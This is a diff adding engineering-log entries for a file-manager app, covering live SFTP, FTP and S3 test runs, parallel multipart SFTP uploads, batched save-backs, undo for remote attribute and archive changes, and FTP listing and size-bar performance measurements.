+suite was dark. A throwaway `sshd` and a `pyftpdlib` server were stood up and all of them run: the
+split-upload suite passed against a real server for the first time (three tests, including the
+four-reports assertion that is the only thing distinguishing the split from the single-stream
+fallback), and so did the relay suite, which needs *both* servers and had therefore almost certainly
+never run either — SFTP→FTP and FTP→SFTP, byte for byte. Full app suite with everything live:
+**979 executed across 161 suites, zero issues**.
+
+The measurement that came out of it corrects the morning's note rather than confirming it. The run
+summary reads `Test run with 1018 tests in 169 suites passed` **identically** with the configs
+present and absent, because a suite disabled by `.enabled(if:)` is still counted — what moves is
+what *executed*, 979/161 against 922/147. So the gap is fourteen suites and ~53 tests, not the eight
+the note named, and the only discriminator is the per-suite list. Two further things fell out. The
+"ten minutes" of prose became `scripts/live_test_servers.sh`, on this project's own argument that a
+check living in prose is not a check; and its first version put the remote root under `${TMPDIR}`,
+which produced **79 issues** claiming a mode write had not been refused when it should have been.
+That is a *fixture* precondition, not a preference: `/private/tmp` is itself gid 0, so a file
+created there lands in `wheel` and `RemoteAttributeWriteLiveTests`' chown to gid 0 — the only way
+`sftp`'s silent set-gid drop is arrangeable — is a permitted no-op, where under `${TMPDIR}` it is a
+real group change and fails `EPERM`. A misplaced fixture reading as a wrong answer about the
+product. The run
+printed `** TEST SUCCEEDED **` under all 79 of them.
+
+Credentials for a dedicated `dirnex-s3-test` IAM user arrived in the same session, so the S3 half
+ran too — all six suites, against a real `eu-north-1` bucket, green. **997 executed across 165
+suites with all three transports live**, against 979/161 for SFTP and FTP alone and 922/147 for
+none. Three of those tests are worth naming because they had been argued from a local endpoint
+until now: a bucket really is created and deleted through the pane's own backend (so the IAM user
+holds `CreateBucket` on the probe ARN), a name another account owns really is refused as globally
+taken rather than as a local collision, and **a stale tag really does refuse the completion of a
+multipart upload and publish nothing** — the 412-inside-a-200 shape §M21 had only ever pinned
+against our own SigV4-verifying endpoint.
+
+**2026-09-01 — Amazon finally answered the multipart questions, and the answer was yes.**
+`S3MultipartLiveIntegrationTests` has carried a doc comment since it shipped saying its subject had
+*"never been answered by Amazon"* — Slices 5 and 8 verified multipart against a local endpoint and
+one S3-compatible account, no kept suite had ever crossed the 64 MiB threshold, and the progress
+suite's ladder deliberately stops below it. It had also never *run*, being gated on a config file
+nobody had (▸ the live-suite skip recorded in NOTES.md the same day). Pointed at a real
+`eu-north-1` bucket on a dedicated IAM user, the 70 MiB round trip **passed in 15.2 s**: the stored
+object is exactly 70 MiB, progress was reported and never exceeded the file, and the bytes came back
+**SHA-256 identical**. So the three rules the path rests on — a part's exact `Content-Length` with no
+chunked framing, ETags quoted back verbatim in the manifest, and a completion that can refuse inside
+a 200 — are confirmed against the service they were written for rather than against a fake.
+
+**The bill is the other assertion, and it is checked outside the suite.** An abandoned multipart
+upload keeps its parts and charges for them while being invisible to an ordinary listing, so the
+bucket's `?uploads` was read **before and after**: 0 either side, with the probe object swept
+(`dirnex-live-probe/` empty) and the bucket's own 11 objects untouched. That is the half a passing
+test cannot show, since the suite would be just as green having left an upload open.
+
+**The other four S3 live suites were then run too, and all sixteen pass** — account (8), conditional
+write (4), pagination (2) and transfer progress (2), in 17.6 s against the same bucket. Between them
+they answer, against Amazon rather than a fake, the things this project had only ever measured
+elsewhere: the 301 region correction and virtual-host addressing, a continuation token refused unless
+re-encoded going back, an upload *and* a download reporting bytes while still running, `If-Match`
+refused on a stale tag and accepted on a current one, `If-None-Match` on an occupied key, a tag for a
+deleted object refused as **gone** rather than as changed, and a stale tag refusing a multipart
+completion and publishing nothing. The three bucket tests pass as well, so the account really does
+carry `s3:CreateBucket` on the one ARN ``S3LiveProbeBucket`` is built around.
+
+**The Keychain hazard this file records for these suites no longer exists, and the fix is
+architectural rather than a cleanup step.** The scar above — a live suite's `removePassword` deleting
+the credential a user's own sidebar row depended on, because the key names the *account* and not who
+filed it — was answered by taking the test host off the real Keychain altogether:
+`SecretKeychain.backing` resolves to an `InMemorySecretStore` whenever `XCTestConfigurationFilePath`
+is set **and** XCTest is actually loaded, two signals rather than one because a false positive would
+silently put the shipping app on a dictionary. So there is nothing to capture and nothing to restore,
+and a run that is killed part-way cannot strand anybody's secret. Verified after the run: the saved
+Amazon item is still there, the probe bucket is 404, and no key of ours reached disk outside a 0600
+scratch file that was wiped.
+
+**2026-09-01 — a large SFTP upload goes in parts; FTP's cannot, and now that is measured.** PLAN.md
+§4's last parity cell, *"No multipart upload over SFTP or FTP"*, and it closed as two different
+answers rather than one. Above 32 MiB an SFTP upload is now cut into parts of 16–32 MiB, **four sent
+at once**, each under a hidden name beside the destination, joined by one server-side `cat` over the
+exec channel and renamed into place only once the size the server reports matches what was sent.
+Measured through the shipped backend against a real `sshd` behind a 2 MB/s-per-connection throttle:
+**16.92 s in one stream against 4.73 s in four parts** for 32 MiB, byte-identical, matching the
+16.85 → 4.32 the bare mechanism measured before any Swift was written.
+
+**The probe overturned the file's own doc comment, which is what the pass was for.**
+`SFTPBackend.copyFile` had said since M5 that an upload could not be split at all, "since a segment's
+route here is the server *reading* a range, and nothing symmetrical exists for writing one". The
+first half is true — `sftp`'s `help` lists `put`, `put -a` and `reput`, all of which append at the
+file's current length — and the conclusion does not follow: parts go under names of their own and
+`cat` joins them. The comment now carries the correction rather than being quietly deleted, the way
+M25 owed one for *"neither remote protocol has a copy verb"*.
+
+**Three ways it is not the download's mirror, and each is a rule with a test whose failure would
+otherwise be silent.** The exec channel is asked for **before** a byte is sent — a refused download
+wastes a download, where here the parts cross the network first and only the join needs the channel,
+so an `sftp`-only account would carry the whole file over and *then* fail. The joined size is checked
+**before** the rename, because `cat` has nothing to compare against and a truncated part splices
+without complaint. And the destination is created by `cat` rather than by `put -p`, so there is no
+transfer verb to carry anything: the mode is applied afterwards through the `applyMetadata` a remote
+Get Info already uses, and the **times are reported lost** — the same trade §M25 Slice 3 shipped for
+the server-side `cp`, bought the same way, with a report rather than with silence.
+
+**The part is a local slice, not the source seeked and bounded remotely, and that was measured
+rather than assumed.** The tempting shape cuts nothing on this disk: hand `ssh` a descriptor already
+seeked to the offset and let a remote `head -c` stop it. Both work and both reassemble identically;
+what kills it is **over-send** — `ssh` keeps pushing until the remote closes, so the wire carried
+**1.35× the part for 4 MiB and 1.13× for 16 MiB**, about 2 MB apiece, the SSH channel window — and a
+truncated part still exits 0. A slice costs one part of scratch and buys exact bounds and `sftp`'s own
+diagnostics, which is `S3PartSlice`'s existing shape.
+
+**FTP closed by being proved impossible, and the measurement is the deliverable.** `curl -C <offset>`
+on an *upload* sends **`APPE`**, not `REST`+`STOR`, so there is no offset in it anywhere. A raw
+`REST` + `STOR` does write at an offset — but only into a file that already exists at that length,
+otherwise `550 No such file or directory` — and nothing can create one without sending the bytes:
+`ALLO` is advisory (`202 No storage allocation necessary`), there is no `SITE TRUNCATE`, and two
+concurrent `APPE`s to one file interleave arbitrarily. The only route sends the file twice. It moved
+to [LOCATION-SUPPORT.md](LOCATION-SUPPORT.md)'s *"cannot be closed from here"* list with the numbers
+behind it. `curl` is **not** what is at fault, and separating that mattered: given a pre-existing file
+it expresses the offset write fine, so this is the protocol's limit and not the tool's.
+
+**The route is withheld from a transport that cannot serve it, rather than degraded into.** The
+protocol's forwarding default sends the parts one at a time, which passes the house test for a
+legitimate default — the file is identical — and is nonetheless *worse than the single `put` it
+replaces*, since the slice, the connection per part, the server-side scratch and the two extra round
+trips are all still paid for a benefit that is no longer there. Worse, it is invisible: the default
+reports progress per part exactly as the concurrent implementation does, so the live suite's own
+discriminator passes either way. Hence `SFTPTransport.sendsPartsConcurrently`, `false` by default and
+read by the fork before anything is spent — the shape `metadataCapabilities` already had. Measured by
+deleting the shipped transport's declaration: **one test of 1018 failed**, which is what says the hole
+was real (NOTES.md ▸ Design lessons, the third instance of a seam whose good answer is also its
+default).
+
+**What is *not* here is a retry unit smaller than the file**, which is what PLAN.md's own wording for
+this cell described. Neither backend has one: S3's multipart aborts the whole upload and throws, and
+SFTP's falls back to a single stream — better, in that the file still lands — but a failed part costs
+the transfer either way. Parity is reached and the capability is not, so it stays written down rather
+than claimed.
+
+**Six negative controls, each firing on the test named for it**, plus the one only a second server
+can run: pointed at an account with `ForceCommand internal-sftp`, the live suite fails on *exactly*
+the assertion that distinguishes the routes — one progress report instead of four — while every other
+assertion passes, which is the degradation working rather than breaking. The live suite's own
+discriminator is that report count, and it had to be added: the first version asserted the bytes
+landed and nothing was left behind, both of which a single-stream fallback satisfies just as well.
+
+**It was §4's last parity cell, so closing it emptied that half of the list** — what is left under
+*Still open* is M15's own cut and nothing else. The narrative that had been sitting in PLAN.md
+alongside this entry moved here on the same day, once the plan had nothing left to say about it: the
+speedup is **3.6×** through the shipped path, and the two halves are worth naming together because
+they are the milestone's answer rather than a result and an excuse — SFTP splits, FTP is refused by
+the protocol, and only one of those is a gap anybody could close later.
+
+**Re-verified end to end against a fresh throwaway `sshd` once the tree was complete**, which was not
+a formality: the live gate is a *file*, so with `/tmp/dirnex_sftp_live_test.json` gone the whole suite
+had been **skipping** rather than failing — a live suite that silently skips is not evidence, and the
+`sendsPartsConcurrently` fix had never been run against a server. Standing one up (a generated host
+key and `MaxStartups 1000:30:2000`, the first field being the lever) gave **3/3** on the segmented
+suite and **37 tests in 7 suites** across every other SFTP live suite, which is what says the
+transport's reshaping cost nothing elsewhere. The `ForceCommand internal-sftp` A/B was re-run in the
+same session and lands exactly where this entry claims: **2 issues** on the sftp-only account against
+**0** on the restored one, same build, the failure naming only the report-count assertion while the
+bytes and the swept directory both still pass. Two things from that run are worth having written
+down: the refusal arrives as OpenSSH's own sentence verbatim on **stdout**, which is why the probe
+needs a token rather than a bare `true`; and the `offCooperativePool` misattribution fired as
+docs/NOTES.md records — every tick read `✔ passed` while the real failures were filed under
+`Test «unknown»`, so the run summary's issue count was the only honest signal.
+
+**And driven through the running app, which is the half a suite cannot reach.** Against a throwaway
+`sshd` first, because it is the only account here that *has* an exec channel (the real NAS is the
+paragraph below); the gesture was the real F5 (`copy selection` over the `.sdef`, from a seeded local tab to a seeded
+remote one) on a **128 MiB** file, which is four parts of 32 MiB — the shipped shape rather than the
+live suite's shrunken one. **The evidence is the transient state, not the session count.** Polling
+the destination directory every 50 ms caught it passing through exactly three: the four parts at
+once, all carrying one run token (`.dirnex-upload-ea4cacc3-bigfile.bin.1…4`); then those four *plus*
+`.joined`, which is the staging name the `cat` writes into; then `bigfile.bin` alone. That sequence
+is the whole design visible from outside — concurrency, the staging name that keeps a partial file
+off the real one, the rename, and the sweep — where the session delta (**10**) is merely consistent
+with it, which is the distinction docs/NOTES.md draws for the Open With probe. SHA-256 identical to
+the source, one file in the directory afterwards.
+
+**The degradation was re-run the same way and is the sharper of the two results.** Restarted
+`ForceCommand internal-sftp` and relaunched, so the connection — and with it the latch — was fresh:
+**zero** `dirnex-upload` names appeared in any poll, the file went straight to its own name in one
+stream, delta **5**, same digest. Nothing was sent and then thrown away, which is the property the
+up-front probe exists for and the one a late refusal would have cost the whole upload.
+
+**Then against the real NAS, which turned out to be the more valuable of the two runs — it declines,
+and it declines in a shape the synthetic server could not have produced.** Oleg's own Synology
+(OpenSSH 8.2), on a purpose-made non-admin account: the SSH **authentication succeeds**, the session
+channel opens, the command is sent, and the *server* answers **`Permission denied, please try
+again.`** with exit 1. So the refusal is a fact about what the account may *run*, arriving after
+everything a connection check would look at has already gone right — and it is a different sentence
+from the `ForceCommand internal-sftp` case this entry measured against (`This service allows sftp
+connections only.`). Two vendors, two wordings, one detection: the probe asks for a **token** back
+rather than for success, so both answer `false` on the same line of code. That is the design choice
+``SSHAssembleCommand/probe(token:)`` argues for, confirmed against hardware nobody wrote it for.
+
+**The whole gesture was then run against it, and behaved.** A 40 MiB file — deliberately *above* the
+32 MiB threshold, so the fork has to consider the split and refuse it rather than never reaching the
+question — copied by the real F5 into the account's own home while an `sftp` poller watched that
+directory: **zero** `dirnex-upload` names in any poll, the directory going straight from empty to the
+file itself, and the bytes SHA-256 identical when read back. A production account on a mainstream NAS
+is therefore a single-stream account, which is worth knowing before reading the 3.6× as something
+every server will give: **the split is the exception the exec channel buys, not the default.**
+
+**2026-09-01 — save-backs coordinate, remote and archive.** PLAN.md §4's last M25 leftover, and the one it
+described most exactly: *"the mirror of a job that already exists rather than a new one"*. A user
+script that rewrote forty files on a server produced forty independent uploads — each its own
+`Task`, each `stat`ing and uploading on its own, with no combined bar, no Stop, no ordering, and
+forty sheets if any of them had something to say. They are now one `.writeBack` job, the mirror of
+the `.materialize` M24 Slice 2 built for the download direction.
+
+**Every save-back goes through it, including a single ⌘S** — Oleg's call, and the download side had
+already settled the same question the same way: a one-row Open With fetch is a queue job with no
+single-file branch. The alternative was to leave the single save on its old path and queue only a
+batch, which is two spellings of "upload an edited file" and the shape this project keeps paying
+for; the two would have drifted the first time the precondition or the re-baseline changed. What a
+single save gains is a queue row and a Stop it did not have.
+
+**The gathering paces itself, and its one constant is borrowed rather than chosen.** A batch opens
+on the first save and closes ``DirectoryWatcher/coalescingWindow`` later — the same window each
+watcher is already holding its events for, so what it waits out is the delivery mechanism rather
+than a guess about how fast a script writes. Everything arriving while a batch is checking or
+uploading joins the *next* one, so a slow script forms a few large batches rather than one per file,
+with no second timer and nothing to tune.
+
+**The checks run sequentially, and that is the ordering rather than a concession.** Forty concurrent
+`stat`s over SFTP is forty connections at once, which a stock OpenSSH server begins refusing at ten
+(`MaxStartups`) — and on S3 each is a billed request nobody is waiting on individually. One pass
+costs a round trip per file and can flood nothing.
+
+**One sheet, and Oleg took the three-way answer.** A check that found nothing is not a question — the
+rule the single save has followed since 2026-08-23, and the common case here by construction, since
+the copies were downloaded minutes earlier by the same gesture that rewrote them. When something is
+contested the sheet says how many of how many and offers **Upload All / Skip Changed Files / Keep
+Editing**: all-or-nothing was the alternative, and cancelling to protect three files would abandon
+thirty-seven edits the user would then have to re-trigger by saving again in an editor that may
+write nothing because nothing changed. The Skip button is withheld when *every* file is contested,
+where it would do exactly what Keep Editing does under a name that says otherwise.
+
+**The job is core code because the seam moved into `VFSBackend`.** A guarded save-back used to reach
+`S3Backend` through an `as? CompositeBackend` cast and a `conditionalWriter(for:)` lookup, which a
+queue runner holding `any VFSBackend` cannot do. ``VFSBackend/writeBack(localPath:to:condition:progress:isCancelled:)``
+replaces it: `S3Backend` forwards to the `upload` it already had, `CompositeBackend` routes on the
+**destination**, and the default writes through `copyFile` — while **throwing rather than dropping**
+a condition it cannot carry. That last rule used to rest on an argument (only an S3 listing carries
+an entity tag, so only S3 is ever asked) and the old code's `nil` lookup fell through to an
+unconditional `copyFile`, i.e. a silently unguarded write under a promise that it was guarded. It is
+now the seam's own default, and the argument is no longer load-bearing.
+
+**The live run found the thing no fake could.** Stopping a batch the moment the second file's bytes
+appeared on the server left `put` having already written them, and the transport then threw — so the
+report does **not** name that destination, correctly, because from inside there is no way to tell a
+transfer that finished a microsecond before the stop from one truncated halfway. The consequence is
+the caller's: an interrupted item's recorded revision is now **dropped** rather than kept, so the
+next save says *"Dirnex has no record of what this file looked like"* — true — instead of *"someone
+else has edited it"*, which would be a confident false sentence about our own write. Two wrong
+triggers came first and each read as a bug in the runner (docs/NOTES.md ▸ the entry this produced).
+
+**The archive half had the same shape and a worse cost, so it took the same gathering.** A rewrite
+is extract-everything → mutate → repack → atomic swap, which is proportional to the **container**
+rather than to what changed in it — so forty edited members saved one at a time meant forty full
+passes over one archive, each extracting and re-compressing everything the previous had just
+written, with forty sheets in front of them. Grouped, it is one pass and one question per archive.
+The switch between the two endings therefore moved from the *edit* to the *batch*: saves are
+gathered first and split afterwards, so one pacing rule serves both instead of each growing a copy.
+
+**Per archive is the unit for both halves of the question, and that is why there is no single sheet
+over a whole batch.** The rewrite is per archive because that is what a repack is; the sentence is
+per archive because it names the archive *and* says whether Undo will be able to put it back, which
+depends on that archive's size against ``ArchiveUndoBudget``. One sheet spanning two archives could
+state neither truthfully. And this half still asks **every time** where the remote half is silent on
+a clean check — a repack rewrites a file the user did not name in this gesture, so silence would
+rewrite an archive because a text editor flushed a buffer. Batching changed how many times that is
+put, not whether it is.
+
+**`ArchiveWriter.add` grew an `ArchiveMutation.Addition` pair, and that is what made one pass
+possible at all.** Its old spelling took many local paths into **one** inner directory, so members
+edited in different folders of the same archive could not travel together — one rewrite per folder
+is barely better than one per file when the cost is the container. The single-directory spelling is
+now one call into the general form, so a paste and a drag are unchanged. Pinned against real
+archives (`ArchiveMultiAddTests`), with the archive's own **inode** as the witness that it really is
+one pass: every rewrite ends in an atomic swap onto a freshly packed file, so N passes would have
+replaced it N times and left N−1 snapshots in the undo store.
+
+**Ten negative controls across the two halves, and two of them are the ones worth having.** The default dropping a condition, the
+runner abandoning the batch on a refusal, over-reporting the landings, Skip uploading everything, the
+button mapping ignoring whether Skip was offered, the grouping losing first-seen order, every
+addition landing in the first item's folder, and one group per member rather than per archive — each
+fails exactly its own test. Two needed a rule extracted before anything *could* fail. Deleting the
+queue's route back to the batch compiled clean and **nothing caught it**: the
+gesture would wait on a report that never comes, and because the gather is serialized, no further
+save-back would happen for the life of the window. So the rule was extracted
+(`BrowserWindowController.reportsToItsGesture(_:)`) — an exhaustive `switch` assertable with no
+window, which retroactively covers `.materialize`'s identical route, untested since M24 Slice 2. The
+batch **split** got the same treatment for the same reason: an archive member routed to the remote
+ending would try to upload to an `archive:` path, and the sentence the user reads would be about a
+server they were never on.
+
+**2026-09-01 — a remote attribute change is undoable.** PLAN.md §4's *"a pair of small pieces
+rather than a hook that already exists"*, taken on the same day as the archive one above and for the
+same reason: it was the last operation in the app that wrote something and put nothing on the undo
+stack. A mode changed over SFTP, or a mode and a modification time over FTP, now journal one step,
+and the panel's note stops saying ⌘Z cannot reverse it.
+
+**What ⌘Z is here is a second write, not a rewind, and the whole design follows from saying so.**
+The local twin (``UndoStep/restoreAttributes(path:actsOnLink:apply:reverse:)``) runs
+`FileAttributeIO`'s syscalls and is deliberately handed a backend it never touches; this one is
+nothing but ``VFSBackend/applyMetadata(_:at:)`` — the very verb Save sends — so there is one
+definition of what a remote metadata write is rather than a second spelling of it for undo. It
+follows that a server free to refuse the original change is free to refuse the reversal, so the
+executor **re-reads the item and weighs the answer** through the same ``RemoteAttributeVerdict``
+Save uses, and a refusal is a failed step (``VFSUnsupportedReason/remoteAttributeRestoreRefused``)
+rather than an undo reported as done. An undo that trusted `sftp`'s exit code would be committing
+precisely the error M25 Slice 5 exists to prevent, one gesture later.
+
+**What may go on the stack is decided field by field, and the two fields are decided by different
+evidence.** The mode rests on the *item's* own answer, so a step is journaled whenever the read-back
+disagrees with what was there before — which covers the measured silent downgrade as well as a clean
+write: `chmod 2755` on a file whose group the account is not in stores `0755`, and a file that went
+`0644 → 0755` has moved and is worth putting back even though the verdict calls that write refused.
+The modification time rests on the *verb's* answer, because a remote `stat` here is a listing row and
+cannot measure one — `ls -la` rounds to the minute and FTP's `LIST` is zone-less on the server's
+clock — so it is journaled only where the transport refused nothing. Both rules err the same way on
+purpose: declining to journal a change that did land costs a ⌘Z that does nothing, where journaling
+one that did *not* land would have ⌘Z write an old value over a field the save never touched.
+
+**No witness, and that is a decision rather than an omission.** The archive step above needs
+``ArchiveUndoWitness`` because its destination is always occupied — it replaces a whole container, so
+only the contents can say whether something else changed it since. A two-field patch names only what
+the edit moved, which is the same exposure the local attributes step has carried since M14; inventing
+a guard for the remote half alone would be a second rule for one side of a pair.
+
+**Six negative controls, and the app-side pair is the point.** In the core: trusting the exit code
+fails only the read-back test; judging the time by the listing fails only the exact-`MFMT` test;
+journaling the mode from what was *asked* rather than from the read-back fails only the silent-
+downgrade test; and journaling unconditionally fails the three "nothing to reverse" tests. In the
+app: dropping the pane's hook fails the reach test, and building the record *after* `reload` — which
+replaces the entry with the server's answer — fails the two that read the recorded values. That last
+pair is the class of bug nothing else can see, because a panel that journaled nothing would save
+exactly as it does now with every other assertion green, which is why `remoteAttributesController(for:)`
+was split out of presenting the panel and `StubPanelHost.recordUndoableAction` stopped being a no-op.
+One control had to be written twice: the first spelling of "drop the pane's hook" matched three sites
+and its `assert` caught it, which is the file's own rule about a control's edit not matching the file
+it is aimed at, met from the safe side.
+
+**2026-09-01 — an archive rewrite is undoable.** PLAN.md §4's last *"a storage decision rather
+than a missing hook"*, taken. Every gesture that rewrites a browsed archive — F8 delete, ⌘V/F5/F6
+add, an edited member saved back — now puts one step on the undo stack, and every one of their
+confirmation sheets stops saying "can't be undone" unless it is true.
+
+**The decision the plan was holding open was what to keep, and the measurement inverted how it
+reads.** A rewrite repacks the container whole, so there is no diff to journal and the only exact
+reversal is the container as it was. Probed before any Swift: on one APFS volume that copy is a
+`clonefile` — **0.1 ms and 0 bytes** for a 200 MB archive — and after the rewrite replaces the
+original, **nothing is freed**, because the copy now holds the blocks the archive released; deleting
+it later returns all of them (104 845 312 for a 100 MB archive, measured). So an undoable rewrite
+does not *spend* disk, it defers reclaiming the archive's old bytes until the record leaves the
+journal. Oleg took a **total budget, oldest given up first** (5 GB) over a per-archive cap, and
+**copy across volumes** rather than leaving an external disk silently non-undoable — the rewrite
+already writes the whole extracted archive to the boot volume's temp directory, so the archive file
+itself is the same order of cost as what already happens.
+
+**The step is its own inverse, and that is the design rather than a coincidence.**
+``UndoStep/restoreArchive(archive:snapshot:expected:restored:)`` **exchanges** the two files — the
+archive takes the snapshot's bytes and the snapshot takes the archive's — so ⇧⌘Z falls out of the
+same code with no second copy stored, and neither direction can destroy the version the other one
+wants. A one-way "put the old bytes back" would have needed a second snapshot for redo and would
+have thrown away the rewrite in between. Ordered so nothing is ever the only copy of itself: clone
+the snapshot to a hidden sibling of the archive, copy the archive's current bytes into the store,
+then two `rename(2)`s — measured, `replaceItemAt` and `rename` both refuse to cross a volume, which
+is why the staging file has to be on the archive's own.
+
+**It is the one step whose destination is always occupied, so its guard had to be invented.** Every
+other step refuses to clobber what it did not create by looking at the *paths*; here the file being
+replaced is the point. ``ArchiveUndoWitness`` — size and modification time, recorded when the
+rewrite landed and checked again at ⌘Z — is what stands in, and it is deliberately **not**
+``ArchiveIdentity``: that type is carried by the inode, which is right for spotting a repacked
+archive and wrong here, because the swap always gives the archive a new one. The negative control
+is the sharp one: with the witness check removed, undoing over an archive somebody else had changed
+put the old container back and discarded theirs.
+
+**The eviction order came from a flake, and the fix was to stop asking the filesystem.** A first
+version ranked snapshots by their files' `st_birthtime` and read it as `tv_sec` — so three taken in
+the same second had an equal key, and `sorted(by:)` is not stable. It failed about one full core run
+in three while passing alone every time, which is what a non-deterministic comparator looks like from
+outside; the first hypothesis (coarse birth times) was measured **wrong** — APFS records them to the
+nanosecond. What replaced it is the journal's own order, handed in as a list rather than a set: the
+store cannot answer "which of these will be wanted last" better than the stack that holds them can.
+Five consecutive full runs green after.
+
+**The app test target runs inside the app, so `undo:` has no default.** Adding one meant every
+existing rewrite test quietly filed a snapshot of its fixture into the *developer's*
+`~/Library/Application Support/Dirnex` — well-formed, so nothing complained. Caught by looking, and
+fixed structurally rather than by a habit each new test has to remember: `ArchiveUndoStorage.Request`
+is a required argument, so a test that wants no store has to say `.none`. Positive control in both
+directions — a snapshot present after a full run before, the directory absent after one since.
+
+Verified live in the LaunchServices-launched app, driving what the code *reads* rather than the
+gesture (F8 ends in a sheet, and no `.sdef` verb enters an archive): a real `.zip` captured and
+rewritten through the core's own encoder, the journal seeded as `Dirnex.undoJournal` with
+`defaults write -data`, then `run operation "edit.undo"`. The archive went `./ ./two.txt` →
+`one.txt two.txt`, **SHA-256 identical** to the pre-rewrite original, and redo and a second undo
+exchanged the two files back and forth with **one** snapshot on disk throughout. The launch prune
+was measured in the same run and carries its own narrowness control: an orphan snapshot no record
+named was gone after launch while the one the journal named survived.
+
+**2026-09-01 — a whole level of an FTP tree over one login.** PLAN.md §4's *"FTP has no
+server-side walk"*, closed — and it still has none, which is the finding rather than a caveat.
+SFTP borrows the server's own `find` over an exec channel and S3 asks for a delimiter-less listing;
+FTP has no recursive verb `curl` can send at all, so it makes one `LIST` per directory and always
+will. It was the last connected backend refusing ``VFSBackend/subtreeListing``, which by then had
+three consumers: search, `DirectorySync`, and — since the entry below — every folder total and size
+bar.
+
+**`LIST -R` was retired at the probe, which decided everything after it.** `curl -X "LIST -R"` does
+send it verbatim, confirmed on the wire; the servers that honour it are the minority — ProFTPD and
+wu-ftpd yes, vsftpd only under `ls_recurse_enable` (off by default, documented as a denial-of-service
+risk), pure-ftpd, FileZilla Server, IIS and pyftpdlib no — and **none reachable from this Mac does**.
+Taking it would have shipped the common case unverified against a second output dialect with its own
+framing hazards, which is the trade M22 refused when it retired GNU `find -printf`.
+
+**What was closeable is the connection around each listing, and that is nearly all of the cost.** One
+`curl` reading a multi-section `-K` config lists a whole *level* over one login. Measured against a
+real server over a 159-directory tree, 527 entries and identical results either way: one invocation
+per directory is **160 invocations and 159 logins**, one per level is **4 and 4** — 1.036 s against
+0.149 s on loopback, and **11.264 s against 0.404 s** with the server 50 ms away. Take the second
+pair: loopback flatters the walk by removing the only cost being replaced, the same warning the SFTP
+measurement carries. A single level of 1000 directories is one login and 0.649 s on 234 KB of config,
+so nothing a pane meets is near a ceiling.
+
+Three probe results shaped the code and none is guessable. **The run must not be parallel** — `-Z`
+opens a connection per transfer, re-buying the login this exists to avoid, and it would still return
+every listing correctly, so no assertion over the *answers* could ever see it; the absence of `-Z` is
+a claim only the argv can carry and has a test of its own. **`curl`'s exit code belongs to the last
+transfer, not the run** — a refused section in the middle leaves exit 0 and the identical refusal
+last gives exit 9 — so a batch cannot be classified at all, and a version that threw on a nonzero
+exit would discard a whole good level whenever its final directory happened to be unreadable, coming
+back short *while still claiming to be complete*. **The per-section answer is the output file**: a
+refused section creates none and an empty directory creates a 0-byte one, so presence separates
+"listed, and empty" from "could not be listed" exactly, and the bytes that arrive are byte-identical
+to a single `LIST` — `FTPListingParser` is reused and no second dialect appears. A fourth kept the
+runner honest: **`max-time` is per transfer, not per run** (five 0.4 s transfers under a 1 s budget
+each ran 2.056 s in total and all five landed), so the *process* backstop had to become the sum of
+the sections where the house rule takes their maximum, which is right for a parallel batch and would
+kill a healthy sequential one part-way through.
+
+The two rules inherited from the walk are opposite and one line apart: **below** the root an
+unreadable directory is skipped, and **at** the root it withdraws the shortcut outright so the walk
+lists the root itself and throws the server's own reason — answering an empty, complete subtree there
+would report an unreadable folder as an empty one. Recursion is on `kind == .directory` rather than
+`isDirectoryLike`, which is what the walk does and what makes a cycle through a symlink unreachable.
+There is no TLS-1.2 retry, for the reason `downloadSegments` has none: a failed batch falls back to
+the walk, whose `listDirectory` already carries it.
+
+Verified live against a real `pyftpdlib` server driving the real `FTPCurlTransport`, with the
+**server's own log** as the independent judge — and the instrument took two corrections before it was
+one. Attributing listings to logins *in order* was contaminated by Swift Testing running the suite's
+four tests in parallel, and keying them on `id(self)` was worse: Python recycles object ids, so four
+concurrent connections silently merged into one and read as batching that was not there. With a
+monotonic per-connection counter the answer is exact — of 53 connections that listed anything,
+**exactly two served more than one listing**, one carrying `docs` and `empty` (level 1 of the
+fixture) and one carrying the three-path batch whose middle path does not exist. The live suite
+compares the shortcut against a **walk of the same tree** rather than against a literal, since the
+seam's contract is that the two are indistinguishable, and that walk is written out by hand rather
+than borrowed from `SubtreeSearch` — reusing a caller of the code under test would prove the two
+agree rather than that either is right. Four negative controls each fired on its own claim: `-Z`
+fails the sequential invariant; conflating `nil` with `""` fails the root case and nothing else,
+correctly, since for a *subdirectory* the two produce the same subtree; throwing on a nonzero exit
+fails the live failure-last assertion; and renaming the witness out of the extension fails the
+existential-dispatch test, which exists because `CompositeBackend` holds an `any VFSBackend` and a
+witness that failed to land would leave the protocol's `nil` default silently in its place.
+
+**2026-09-01 — size bars wherever a folder has siblings.** PLAN.md §4's *"Size bars are local-only
+for a cost reason that covers only half of what it gates"*, closed. `areSizeBarsVisible` required
+`panel.path.backend == .local` — a rule written twice by hand, once there and once in the menu
+validator — and the argument behind it (a bar needs *every* sibling's total, which remotely is N
+walks where the cursor's own is one) was wrong about one backend and out of date about the others.
+
+**An archive never cost anything, and the project's own type had been saying so since M21.**
+`DirectorySizeBudget.forBackend` calls an archive *unbounded* because its listings come out of a
+`bsdtar -tvf` already in memory — which is why **Space on a folder inside a zip has always sized
+it**, under exactly the reasoning the bars refused. Measured through the real `DirectorySizer` on a
+1410-directory archive: **6.5 ms**, against **47 ms** for the identical tree on disk, or 5.8 µs a
+directory against 33 — six times cheaper than the case that was always allowed. Linear to 24 200
+directories (141 ms). One property now answers for both readers (`canShowSizeBars`), which is this
+file's most repeated bug retired at one more site.
+
+**The set costs one walk of the parent, not N of them**, which is the measurement the whole design
+turns on: sibling subtrees are disjoint, so however the work is sliced it is the same directories
+listed once each. Sizing 40 top-level rows separately came to **6.46 ms against the container's
+6.59 ms**, and against a live `sshd` the set of 8 spent **136 sessions against the whole walk's
+137**. So what a bounded backend was missing was never a bigger number — it was an allowance held
+across the *set*, where N rows each entitled to `DirectorySizeBudget.remote`'s thousand listings is
+N thousand billed requests for one keystroke.
+
+**And the sizer had been asking for everything the expensive way.** `VFSBackend.subtreeListing`
+shipped at M22 for search and was adopted by `DirectorySync` at M25; `DirectorySizer` walked a
+directory at a time and never asked. Probed against a real `sshd` before any Swift, over 136
+directories: **137 sessions and 19.24 s** walking, **1 session and 0.156 s** through the shortcut,
+and the byte totals identical (748 654 each way) — which is the control that makes the two routes
+interchangeable rather than merely comparable. It now asks first and walks when there is no answer,
+so the shortcut's three refusals all fail safe: a backend without one (every local path, and an
+`internal-sftp` account) answers `nil`; an **incomplete** listing is refused, because SFTP caps its
+own output and a capped slice summed as a total is a confident wrong number; and a shortcut that
+throws falls back too, since the walk behind it will surface a real failure with a real error.
+Cancellation is the one thing that travels.
+
